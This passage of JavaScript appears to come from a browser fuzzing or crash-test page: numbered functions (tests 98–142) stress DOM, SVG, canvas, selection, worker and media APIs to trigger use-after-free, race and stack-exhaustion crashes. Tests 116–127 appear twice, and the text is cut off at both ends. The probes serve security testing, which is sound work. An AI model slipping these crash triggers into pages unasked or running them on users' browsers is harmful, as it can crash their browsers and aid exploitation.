                    ctx.clip();
                }
                // No restore, leave stack full
            } catch(e) {
                addLog('Test 116 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 117: DataTransfer setDragImage + remove
        function test117_DataTransferDragImage() {
            addLog('TEST 117: DragImage element removal');
            try {
                const div = document.createElement('div');
                div.draggable = true;
                const img = document.createElement('img');
                
                div.ondragstart = function(e) {
                    e.dataTransfer.setDragImage(img, 0, 0);
                    // Remove image immediately
                    img.remove();
                };
                
                testArea.appendChild(div);
                div.dispatchEvent(new DragEvent('dragstart'));
            } catch(e) {
                addLog('Test 117 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 118: HTMLOptionsCollection length setter
        function test118_HTMLOptionsCollection() {
            addLog('TEST 118: Select options length manipulation');
            try {
                const select = document.createElement('select');
                // Force large allocation
                select.options.length = 10000;
                select.options.length = 0;
                select.options.length = 10000;
                testArea.appendChild(select);
            } catch(e) {
                addLog('Test 118 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 119: Iframe srcdoc race
        function test119_IframeSrcdocRace() {
            addLog('TEST 119: Iframe srcdoc write race');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                
                iframe.srcdoc = '<script>parent.postMessage("loaded", "*")<\/script>';
                
                // Immediately remove
                testArea.removeChild(iframe);
            } catch(e) {
                addLog('Test 119 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 120: Worker Transferable
        function test120_WorkerTransferable() {
            addLog('TEST 120: Worker Transferable buffer');
            try {
                const ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB
                const worker = new Worker(URL.createObjectURL(new Blob(['onmessage = function(e) { postMessage("done"); }'])));
                
                worker.postMessage(ab, [ab]); // Transfer ownership
                
                try {
                    // Try to access neutered buffer
                    const view = new Uint8Array(ab);
                    view[0] = 1; 
                } catch(err) {
                    // Expected
                }
                worker.terminate();
            } catch(e) {
                addLog('Test 120 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 121: Shadow DOM Slot Assignment (if supported)
        function test121_SlotAssignment() {
            addLog('TEST 121: Manual slot assignment');
            try {
                const host = document.createElement('div');
                if (host.attachShadow) {
                    const shadow = host.attachShadow({mode: 'open'});
                    const slot = document.createElement('slot');
                    slot.name = 's';
                    shadow.appendChild(slot);
                    
                    const child = document.createElement('div');
                    child.slot = 's';
                    host.appendChild(child);
                    
                    // Rapidly change slot name
                    child.slot = 'other';
                    child.slot = 's';
                }
                testArea.appendChild(host);
            } catch(e) {
                addLog('Test 121 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 122: AudioBufferSourceNode + Detach
        function test122_AudioBufferSource() {
            addLog('TEST 122: AudioBufferSource + buffer detach');
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const buffer = ctx.createBuffer(1, 22050, 44100);
                const source = ctx.createBufferSource();
                source.buffer = buffer;
                source.connect(ctx.destination);
                source.start();
                
                // Stop and disconnect rapidly
                source.stop();
                source.disconnect();
            } catch(e) {
                addLog('Test 122 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 123: OffscreenCanvas (if supported)
        function test123_OffscreenCanvas() {
            addLog('TEST 123: OffscreenCanvas transfer');
            try {
                if (window.OffscreenCanvas) {
                    const canvas = document.createElement('canvas');
                    const offscreen = canvas.transferControlToOffscreen();
                    const ctx = offscreen.getContext('2d');
                    ctx.fillRect(0,0,10,10);
                    // Post to worker
                    const worker = new Worker(URL.createObjectURL(new Blob([''])));
                    worker.postMessage({canvas: offscreen}, [offscreen]);
                } else {
                    addLog('OffscreenCanvas not supported');
                }
            } catch(e) {
                addLog('Test 123 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 124: ResizeObserver Loop Limit
        function test124_ResizeObserverLoop() {
            addLog('TEST 124: ResizeObserver infinite loop');
            try {
                if (window.ResizeObserver) {
                    const div = document.createElement('div');
                    testArea.appendChild(div);
                    const ro = new ResizeObserver(entries => {
                        div.style.width = (Math.random() * 100) + 'px';
                    });
                    ro.observe(div);
                    setTimeout(() => ro.disconnect(), 1000);
                } else {
                    addLog('ResizeObserver not supported');
                }
            } catch(e) {
                addLog('Test 124 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 125: IntersectionObserver + remove
        function test125_IntersectionObserver() {
            addLog('TEST 125: IntersectionObserver + removeChild');
            try {
                if (window.IntersectionObserver) {
                    const div = document.createElement('div');
                    testArea.appendChild(div);
                    const io = new IntersectionObserver(entries => {
                        testArea.removeChild(div);
                        io.disconnect();
                    });
                    io.observe(div);
                } else {
                    addLog('IntersectionObserver not supported');
                }
            } catch(e) {
                addLog('Test 125 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 126: CustomElement Upgrade
        function test126_CustomElementUpgrade() {
            addLog('TEST 126: Custom Element Upgrade');
            try {
                class MyEl extends HTMLElement {
                    connectedCallback() {
                        this.innerHTML = 'Upgraded';
                    }
                }
                const name = 'x-test-' + Date.now();
                const el = document.createElement(name);
                testArea.appendChild(el);
                
                customElements.define(name, MyEl); // Upgrade happens here
            } catch(e) {
                addLog('Test 126 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 127: Final Crash Toggle (Memory Pressure)
        function test127_FinalCrashToggle() {
            addLog('TEST 127: Rapid DOM Thrashing + Memory');
            try {
                const arr = [];
                for(let i=0; i<1000; i++) {
                    const div = document.createElement('div');
                    div.textContent = 'Stress ' + i;
                    testArea.appendChild(div);
                    arr.push(div);
                }
                // Reverse remove
                while(arr.length > 0) {
                    const div = arr.pop();
                    testArea.removeChild(div);
                }
            } catch(e) {
                addLog('Test 127 Exception: ' + e.message, true);
                crashes++;
            }
        }
// NEW TEST 98: TreeWalker + removeChild (Classic WebKit UAF Vector)
        function test98_TreeWalkerRemove() {
            addLog('TEST 98: TreeWalker traversal with node removal');
            try {
                const root = document.createElement('div');
                root.innerHTML = '<span>A</span><b>B</b><i>C</i>';
                testArea.appendChild(root);
                
                const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);
                
                let node = walker.nextNode();
                while(node) {
                    const next = walker.nextNode();
                    if (node.parentNode) {
                        // Removing the node currently being traversed is dangerous
                        node.parentNode.removeChild(node); 
                    }
                    node = next;
                }
            } catch(e) {
                addLog('Test 98 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 99: NodeIterator + replaceChild
        function test99_NodeIteratorReplace() {
            addLog('TEST 99: NodeIterator + replaceChild');
            try {
                const root = document.createElement('div');
                for(let i=0; i<10; i++) root.appendChild(document.createElement('span'));
                testArea.appendChild(root);

                const iter = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
                let node;
                while(node = iter.nextNode()) {
                    const comment = document.createComment('replaced');
                    if (node.parentNode) {
                        // Replace node under iterator to invalidate internal pointer
                        node.parentNode.replaceChild(comment, node); 
                    }
                }
            } catch(e) {
                addLog('Test 99 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 100: MutationObserver Infinite Loop (Stack Overflow/Crash)
        function test100_MutationObserverLoop() {
            addLog('TEST 100: MutationObserver recursive modification');
            try {
                const target = document.createElement('div');
                testArea.appendChild(target);
                
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        // Trigger another mutation immediately inside callback
                        target.setAttribute('data-test', Math.random());
                        target.appendChild(document.createElement('span'));
                    });
                });
                
                observer.observe(target, { attributes: true, childList: true });
                target.setAttribute('data-start', 'true');
                
                // Stop after 2 seconds to avoid permanent freeze
                setTimeout(() => observer.disconnect(), 2000);
            } catch(e) {
                addLog('Test 100 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 101: Range surroundContents + extractContents (DOM corruption)
        function test101_RangeSurroundExtract() {
            addLog('TEST 101: Range manipulation on same nodes');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<p>Start</p><b>Middle</b><p>End</p>';
                testArea.appendChild(div);
                
                const range = document.createRange();
                range.selectNode(div.querySelector('b'));
                
                const wrapper = document.createElement('div');
                range.surroundContents(wrapper);
                
                // Immediately try to extract from potentially unstable DOM state
                range.extractContents(); 
            } catch(e) {
                addLog('Test 101 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 102: Selection.modify + DOM Removal
        function test102_SelectionModifyCrash() {
            addLog('TEST 102: Selection.modify + Node removal');
            try {
                const div = document.createElement('div');
                div.contentEditable = true;
                div.textContent = 'Some text to select';
                testArea.appendChild(div);
                div.focus();
                
                const sel = window.getSelection();
                sel.selectAllChildren(div);
                
                // Modify selection while removing parent
                sel.modify('extend', 'forward', 'word');
                testArea.removeChild(div);
                // Attempt to modify selection on a detached node
                sel.modify('extend', 'forward', 'word'); 
            } catch(e) {
                addLog('Test 102 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 103: DOMParser + Heavy Load
        function test103_DOMParserAbort() {
            addLog('TEST 103: Heavy DOM Parsing');
            try {
                const parser = new DOMParser();
                // Create massive XML string
                const heavyXML = '<root>' + '<item>Test</item>'.repeat(5000) + '</root>';
                
                const doc = parser.parseFromString(heavyXML, 'text/xml');
                // Accessing property immediately after parse
                doc.documentElement.innerHTML = ''; 
            } catch(e) {
                addLog('Test 103 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 104: Canvas toBlob (Async) + Context Loss
        function test104_CanvasBlobRace() {
            addLog('TEST 104: Canvas toBlob + Context destruction');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 1024;
                canvas.height = 1024;
                const ctx = canvas.getContext('2d');
                ctx.fillRect(0,0,1024,1024);
                
                canvas.toBlob(function(blob) {
                    // This callback runs async. 
                    // By now we will have destroyed the canvas.
                    const newCtx = canvas.getContext('2d');
                    if(newCtx) newCtx.fillRect(0,0,10,10);
                });
                
                // Destroy immediately
                canvas.width = 0;
                canvas.height = 0;
                testArea.removeChild(canvas);
            } catch(e) {
                addLog('Test 104 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 105: XHR Synchronous + onpagehide (Event Loop Freeze)
        function test105_XHRSyncPageHide() {
            addLog('TEST 105: Sync XHR during pagehide');
            try {
                window.onpagehide = function() {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', location.href, false); // Sync request
                    xhr.send(null);
                };
                
                // Simulate event
                window.dispatchEvent(new Event('pagehide'));
            } catch(e) {
                addLog('Test 105 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 106: FontFace loading + document.fonts.clear
        function test106_FontFaceClear() {
            addLog('TEST 106: FontFace load race');
            try {
                const font = new FontFace('TestFont', 'url(about:blank)');
                document.fonts.add(font);
                
                font.load().then(function() {
                    // Do nothing
                }).catch(function() {
                    // Expected error
                });
                
                document.fonts.clear(); // Clear while loading is pending
            } catch(e) {
                addLog('Test 106 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 107: Navigator Locks (if available)
        function test107_NavigatorLocksRace() {
            addLog('TEST 107: Navigator Locks Request');
            try {
                if (navigator.locks) {
                    navigator.locks.request('resource', async (lock) => {
                        // Hold lock
                        await new Promise(r => setTimeout(r, 100));
                    });
                    // Request same lock immediately to stress queue
                    navigator.locks.request('resource', (lock) => {});
                } else {
                    addLog('Navigator Locks not supported');
                }
            } catch(e) {
                addLog('Test 107 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 108: matchMedium / StyleMedia (Deprecated API)
        function test108_StyleMediaMatch() {
            addLog('TEST 108: StyleMedia matchMedium loop');
            try {
                if (window.styleMedia) {
                    for(let i=0; i<100; i++) {
                        window.styleMedia.matchMedium('screen and (min-width: '+i+'px)');
                    }
                }
            } catch(e) {
                addLog('Test 108 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 109: Create NodeIterator with Filter + Detach
        function test109_CreateNodeIteratorFilter() {
            addLog('TEST 109: NodeIterator filter side-effect detach');
            try {
                const root = document.createElement('div');
                testArea.appendChild(root);
                root.appendChild(document.createElement('span'));
                
                const filter = {
                    acceptNode: function(node) {
                        testArea.innerHTML = ''; // Dangerous: Detach everything during filter execution
                        return NodeFilter.FILTER_ACCEPT;
                    }
                };
                
                const iter = document.createNodeIterator(root, NodeFilter.SHOW_ALL, filter);
                iter.nextNode(); // Trigger filter
            } catch(e) {
                addLog('Test 109 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 110: TextTrack removeCue
        function test110_TextTrackCueRemove() {
            addLog('TEST 110: TextTrack removeCue manipulation');
            try {
                const video = document.createElement('video');
                const track = video.addTextTrack('subtitles');
                const cue = new VTTCue(0, 1, 'Test');
                track.addCue(cue);
                
                track.oncuechange = function() {
                    track.removeCue(cue);
                    track.addCue(cue); // Add back immediately (confuse track list)
                };
                
                video.currentTime = 0.5; // Trigger cue change
            } catch(e) {
                addLog('Test 110 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 111: CSS Animation PlayState Flood
        function test111_AnimationPlayState() {
            addLog('TEST 111: Toggling animation-play-state rapidly');
            try {
                const div = document.createElement('div');
                div.style.cssText = 'animation: spin 1s infinite;';
                testArea.appendChild(div);
                
                let count = 0;
                const interval = setInterval(() => {
                    div.style.animationPlayState = (count++ % 2 === 0) ? 'paused' : 'running';
                    if (count > 20) {
                        clearInterval(interval);
                        testArea.removeChild(div);
                    }
                }, 10);
            } catch(e) {
                addLog('Test 111 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 112: Crypto getRandomValues Large Buffer (OOM)
        function test112_CryptoLargeBuffer() {
            addLog('TEST 112: Crypto large buffer allocation');
            try {
                if (window.crypto) {
                    const arr = new Uint8Array(65536);
                    for(let i=0; i<100; i++) {
                        window.crypto.getRandomValues(arr);
                    }
                }
            } catch(e) {
                addLog('Test 112 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 113: History API Flood
        function test113_HistoryPushStateFlood() {
            addLog('TEST 113: History pushState flood');
            try {
                for(let i=0; i<50; i++) {
                    history.pushState({id: i}, 'Title ' + i, '#state'+i);
                }
            } catch(e) {
                addLog('Test 113 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 114: Form requestSubmit + DOM Removal
        function test114_FormRequestSubmit() {
            addLog('TEST 114: Form requestSubmit + remove');
            try {
                const form = document.createElement('form');
                form.onsubmit = function(e) {
                    e.preventDefault();
                    testArea.removeChild(form); // Detach form during submit processing
                };
                testArea.appendChild(form);
                if (form.requestSubmit) {
                    form.requestSubmit();
                } else {
                    form.dispatchEvent(new Event('submit'));
                }
            } catch(e) {
                addLog('Test 114 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 115: SVG <use> Shadow Tree Recursion
        function test115_SVGUseShadowTree() {
            addLog('TEST 115: SVG use element recursive shadow tree');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
                const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
                g.id = 'group';
                defs.appendChild(g);
                svg.appendChild(defs);
                
                const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
                use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#group');
                
                g.appendChild(use); // Recursive reference (SVG should handle, but stress test)
                testArea.appendChild(svg);
            } catch(e) {
                addLog('Test 115 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 116: Canvas Clip Stack Exhaustion
        function test116_CanvasClipStack() {
            addLog('TEST 116: Canvas clip() recursion stack overflow');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                for(let i=0; i<1000; i++) {
                    ctx.save();
                    ctx.rect(0,0,10,10);
                    ctx.clip();
                }
                // No restore, leave stack full to stress renderer
            } catch(e) {
                addLog('Test 116 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 117: DataTransfer setDragImage + remove
        function test117_DataTransferDragImage() {
            addLog('TEST 117: DragImage element removal');
            try {
                const div = document.createElement('div');
                div.draggable = true;
                const img = document.createElement('img');
                
                div.ondragstart = function(e) {
                    e.dataTransfer.setDragImage(img, 0, 0);
                    // Remove image immediately after setting as drag image
                    img.remove();
                };
                
                testArea.appendChild(div);
                div.dispatchEvent(new DragEvent('dragstart'));
            } catch(e) {
                addLog('Test 117 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 118: HTMLOptionsCollection length setter
        function test118_HTMLOptionsCollection() {
            addLog('TEST 118: Select options length manipulation');
            try {
                const select = document.createElement('select');
                // Force large allocation and deallocation
                select.options.length = 10000;
                select.options.length = 0;
                select.options.length = 10000;
                testArea.appendChild(select);
            } catch(e) {
                addLog('Test 118 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 119: Iframe srcdoc race
        function test119_IframeSrcdocRace() {
            addLog('TEST 119: Iframe srcdoc write race');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                
                iframe.srcdoc = '<script>parent.postMessage("loaded", "*")<\/script>';
                
                // Immediately remove iframe while srcdoc is processing
                testArea.removeChild(iframe);
            } catch(e) {
                addLog('Test 119 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 120: Worker Transferable (Neutering)
        function test120_WorkerTransferable() {
            addLog('TEST 120: Worker Transferable buffer access');
            try {
                const ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB
                const worker = new Worker(URL.createObjectURL(new Blob(['onmessage = function(e) { postMessage("done"); }'])));
                
                worker.postMessage(ab, [ab]); // Transfer ownership to worker
                
                try {
                    // Try to access neutered buffer (Should throw, but if not -> UAF)
                    const view = new Uint8Array(ab);
                    view[0] = 1; 
                } catch(err) {
                    // Expected behavior
                }
                worker.terminate();
            } catch(e) {
                addLog('Test 120 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 121: Shadow DOM Slot Assignment
        function test121_SlotAssignment() {
            addLog('TEST 121: Manual slot assignment thrashing');
            try {
                const host = document.createElement('div');
                if (host.attachShadow) {
                    const shadow = host.attachShadow({mode: 'open'});
                    const slot = document.createElement('slot');
                    slot.name = 's';
                    shadow.appendChild(slot);
                    
                    const child = document.createElement('div');
                    child.slot = 's';
                    host.appendChild(child);
                    
                    // Rapidly change slot name to trigger distribution recalc
                    child.slot = 'other';
                    child.slot = 's';
                }
                testArea.appendChild(host);
            } catch(e) {
                addLog('Test 121 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 122: AudioBufferSourceNode + Detach
        function test122_AudioBufferSource() {
            addLog('TEST 122: AudioBufferSource + buffer detach');
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return;
                
                const ctx = new AudioContext();
                const buffer = ctx.createBuffer(1, 22050, 44100);
                const source = ctx.createBufferSource();
                source.buffer = buffer;
                source.connect(ctx.destination);
                source.start();
                
                // Stop and disconnect rapidly
                source.stop();
                source.disconnect();
            } catch(e) {
                addLog('Test 122 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 123: OffscreenCanvas (if supported)
        function test123_OffscreenCanvas() {
            addLog('TEST 123: OffscreenCanvas transfer race');
            try {
                if (window.OffscreenCanvas) {
                    const canvas = document.createElement('canvas');
                    const offscreen = canvas.transferControlToOffscreen();
                    const ctx = offscreen.getContext('2d');
                    ctx.fillRect(0,0,10,10);
                    // Post to worker to create concurrency
                    const worker = new Worker(URL.createObjectURL(new Blob([''])));
                    worker.postMessage({canvas: offscreen}, [offscreen]);
                } else {
                    addLog('OffscreenCanvas not supported');
                }
            } catch(e) {
                addLog('Test 123 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 124: ResizeObserver Loop Limit
        function test124_ResizeObserverLoop() {
            addLog('TEST 124: ResizeObserver infinite loop');
            try {
                if (window.ResizeObserver) {
                    const div = document.createElement('div');
                    testArea.appendChild(div);
                    const ro = new ResizeObserver(entries => {
                        // Modifying style inside observer triggers loop
                        div.style.width = (Math.random() * 100) + 'px';
                    });
                    ro.observe(div);
                    setTimeout(() => ro.disconnect(), 1000);
                } else {
                    addLog('ResizeObserver not supported');
                }
            } catch(e) {
                addLog('Test 124 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 125: IntersectionObserver + remove
        function test125_IntersectionObserver() {
            addLog('TEST 125: IntersectionObserver + removeChild');
            try {
                if (window.IntersectionObserver) {
                    const div = document.createElement('div');
                    testArea.appendChild(div);
                    const io = new IntersectionObserver(entries => {
                        // Remove observed element inside callback
                        testArea.removeChild(div);
                        io.disconnect();
                    });
                    io.observe(div);
                } else {
                    addLog('IntersectionObserver not supported');
                }
            } catch(e) {
                addLog('Test 125 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 126: CustomElement Upgrade
        function test126_CustomElementUpgrade() {
            addLog('TEST 126: Custom Element Upgrade Race');
            try {
                class MyEl extends HTMLElement {
                    connectedCallback() {
                        this.innerHTML = 'Upgraded';
                    }
                }
                const name = 'x-test-' + Date.now();
                const el = document.createElement(name);
                testArea.appendChild(el);
                
                // Define element after creation to trigger upgrade process
                customElements.define(name, MyEl); 
            } catch(e) {
                addLog('Test 126 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 127: Final Crash Toggle (Memory Pressure)
        function test127_FinalCrashToggle() {
            addLog('TEST 127: Rapid DOM Thrashing + Memory');
            try {
                const arr = [];
                // Create massive amount of nodes
                for(let i=0; i<2000; i++) {
                    const div = document.createElement('div');
                    div.textContent = 'Stress ' + i;
                    testArea.appendChild(div);
                    arr.push(div);
                }
                // Reverse remove to stress layout engine
                while(arr.length > 0) {
                    const div = arr.pop();
                    testArea.removeChild(div);
                }
            } catch(e) {
                addLog('Test 127 Exception: ' + e.message, true);
                crashes++;
            }
        }
// TEST 128: Table Caption UAF Loop (Aggressive)
        function test128_TableCaptionLoop() {
            addLog('TEST 128: Rapid createCaption/deleteCaption loop');
            try {
                const table = document.createElement('table');
                testArea.appendChild(table);
                for(let i=0; i<500; i++) {
                    const cap = table.createCaption();
                    // Force layout update
                    cap.offsetWidth; 
                    table.deleteCaption();
                    // Force layout update on deleted
                    try { cap.innerHTML = 'dead'; } catch(e){}
                }
            } catch(e) {
                addLog('Test 128 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 129: Selection Detach Race
        function test129_SelectionDetachRace() {
            addLog('TEST 129: Selection collapse on detached node');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<b>Target</b>';
                testArea.appendChild(div);
                const target = div.firstChild;
                
                const sel = window.getSelection();
                sel.collapse(target, 0);
                
                testArea.removeChild(div);
                // Attempt to modify selection on detached node
                for(let i=0; i<100; i++) {
                    sel.extend(target, 1);
                }
            } catch(e) {
                addLog('Test 129 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 130: SVG Text Layout Crash
        function test130_SVGTextLayoutCrash() {
            addLog('TEST 130: SVG Text getComputedTextLength + removal');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
                text.textContent = 'CrashMe';
                svg.appendChild(text);
                testArea.appendChild(svg);
                
                // Force layout
                text.getComputedTextLength();
                
                // Remove and access immediately
                svg.removeChild(text);
                text.getComputedTextLength(); 
            } catch(e) {
                addLog('Test 130 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 131: Pointer Capture + Remove
        function test131_PointerCaptureRemove() {
            addLog('TEST 131: setPointerCapture and remove element');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                div.onpointerdown = function(e) {
                    try {
                        div.setPointerCapture(e.pointerId);
                        testArea.removeChild(div);
                        // Trigger event on removed element with capture
                        div.dispatchEvent(new PointerEvent('pointermove'));
                    } catch(err) {}
                };
                
                div.dispatchEvent(new PointerEvent('pointerdown'));
            } catch(e) {
                addLog('Test 131 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 132: Range Insert Fragment + Mutation Event
        function test132_RangeInsertFrag() {
            addLog('TEST 132: Range insertNode with aggressive mutation');
            try {
                const p = document.createElement('p');
                testArea.appendChild(p);
                const range = document.createRange();
                range.setStart(p, 0);
                range.setEnd(p, 0);
                
                const frag = document.createDocumentFragment();
                const span = document.createElement('span');
                frag.appendChild(span);
                
                // Recursive insertion attempt
                span.addEventListener('DOMNodeInserted', function() {
                    range.insertNode(document.createElement('b'));
                });
                
                range.insertNode(frag);
            } catch(e) {
                addLog('Test 132 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 133: SplitText + Normalize Race
        function test133_SplitTextNormalize() {
            addLog('TEST 133: splitText vs normalize loop');
            try {
                const div = document.createElement('div');
                const text = document.createTextNode('SplitNormalizeSplitNormalize');
                div.appendChild(text);
                testArea.appendChild(div);
                
                for(let i=0; i<100; i++) {
                    const split = text.splitText(5);
                    div.normalize();
                    // text node might be invalid now if merged
                    split.textContent = 'A'; 
                }
            } catch(e) {
                addLog('Test 133 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 134: Style Item Mutation
        function test134_StyleItemMutation() {
            addLog('TEST 134: CSSStyleDeclaration item access + removeProperty');
            try {
                const div = document.createElement('div');
                div.style.cssText = 'color: red; background: blue; border: 1px solid black;';
                
                const style = div.style;
                const len = style.length;
                
                for(let i=0; i<len; i++) {
                    // Remove property while iterating by index
                    const prop = style.item(0);
                    style.removeProperty(prop);
                    // Access out of bounds potentially
                    const dead = style.item(i); 
                }
            } catch(e) {
                addLog('Test 134 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 135: Input Type Switch Crash
        function test135_InputTypeSwitch() {
            addLog('TEST 135: Input type switching with value set');
            try {
                const input = document.createElement('input');
                testArea.appendChild(input);
                
                const types = ['text', 'range', 'date', 'color', 'file', 'image'];
                
                for(let i=0; i<50; i++) {
                    input.type = types[i % types.length];
                    input.value = 'test'; // Force internal value sanitization
                    input.type = 'checkbox';
                    input.checked = true;
                }
            } catch(e) {
                addLog('Test 135 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 136: SVG Animate Begin + Remove
        function test136_SVGAnimateRemove() {
            addLog('TEST 136: SVG Animation beginElement + remove');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                const anim = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
                
                anim.setAttribute('attributeName', 'x');
                anim.setAttribute('to', '100');
                anim.setAttribute('dur', '1s');
                
                rect.appendChild(anim);
                svg.appendChild(rect);
                testArea.appendChild(svg);
                
                anim.beginElement();
                // Remove anim element immediately after start
                rect.removeChild(anim);
                // Try to restart (should fail or crash)
                try { anim.beginElement(); } catch(e){}
            } catch(e) {
                addLog('Test 136 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 137: TreeWalker Filter Exception
        function test137_TreeWalkerFilterThrow() {
            addLog('TEST 137: TreeWalker filter throwing exception');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<span>A</span><span>B</span>';
                testArea.appendChild(div);
                
                const walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT, {
                    acceptNode: function(node) {
                        if (node.tagName === 'SPAN') {
                            testArea.removeChild(div); // Destroy tree during filter
                            throw new Error('Boom');
                        }
                        return NodeFilter.FILTER_ACCEPT;
                    }
                });
                
                try { walker.nextNode(); } catch(e) {}
                // Access walker after exception
                walker.currentNode; 
            } catch(e) {
                addLog('Test 137 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 138: MediaSource Remove
        function test138_MediaSourceRemove() {
            addLog('TEST 138: MediaSource + URL revoke + remove');
            try {
                if (window.MediaSource) {
                    const ms = new MediaSource();
                    const url = URL.createObjectURL(ms);
                    const video = document.createElement('video');
                    video.src = url;
                    
                    ms.onsourceopen = function() {
                        URL.revokeObjectURL(url);
                        testArea.removeChild(video); // Detach video
                        try { ms.endOfStream(); } catch(e){}
                    };
                    
                    testArea.appendChild(video);
                }
            } catch(e) {
                addLog('Test 138 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 139: Window Stop Race
        function test139_WindowStopRace() {
            addLog('TEST 139: window.stop() during loading');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                iframe.src = window.location.href;
                
                setTimeout(() => {
                    iframe.contentWindow.stop();
                    testArea.removeChild(iframe);
                }, 10);
            } catch(e) {
                addLog('Test 139 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 140: OffsetParent Display Toggle
        function test140_OffsetParentDisplay() {
            addLog('TEST 140: offsetParent access loop with display:none');
            try {
                const div = document.createElement('div');
                const child = document.createElement('div');
                div.appendChild(child);
                testArea.appendChild(div);
                
                for(let i=0; i<200; i++) {
                    div.style.display = 'none';
                    // Force layout
                    const op = child.offsetParent;
                    div.style.display = 'block';
                    const op2 = child.offsetParent;
                }
            } catch(e) {
                addLog('Test 140 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 141: ScrollIntoView Remove
        function test141_ScrollIntoViewRemove() {
            addLog('TEST 141: scrollIntoView behavior + removal');
            try {
                const div = document.createElement('div');
                div.textContent = 'Scroll Me';
                testArea.appendChild(div);
                
                // Using smooth scroll which is async
                div.scrollIntoView({behavior: 'smooth'});
                // Remove immediately
                testArea.removeChild(div);
            } catch(e) {
                addLog('Test 141 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 142: Form Reset Output
        function test142_FormResetOutput() {
            addLog('TEST 142: Form reset with <output> element');
            try {
                const form = document.createElement('form');
                const out = document.createElement('output');
                out.defaultValue = 'Default';
                form.appendChild(out);
                testArea.appendChild(form);
